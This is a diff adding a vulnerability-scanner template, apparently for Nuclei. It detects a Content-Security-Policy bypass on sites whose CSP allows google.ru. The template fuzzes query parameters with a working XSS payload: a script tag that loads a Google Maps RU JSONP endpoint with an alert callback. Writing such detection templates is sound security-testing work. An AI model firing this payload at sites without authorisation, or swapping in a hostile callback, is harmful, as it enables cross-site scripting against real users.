@@ -1,0 +1,55 @@
+id: google-maps-ru-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google Maps RU
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-maps-ru
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "google.ru"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_maps_ru_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://maps.google.ru/maps/api/js?sensor=false&callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_maps_ru_csp_xss == true"
+# digest: 4a0a00473045022100e83ccf059e4b1b5180f46c90995f268aed06016c62ae7149e461adafcde6a98102205be6d100eba541c771060a86c7370a9f75b23af17d9501ad3b677c9f0986897f:922c64590222798bb761d5b6d8e72950
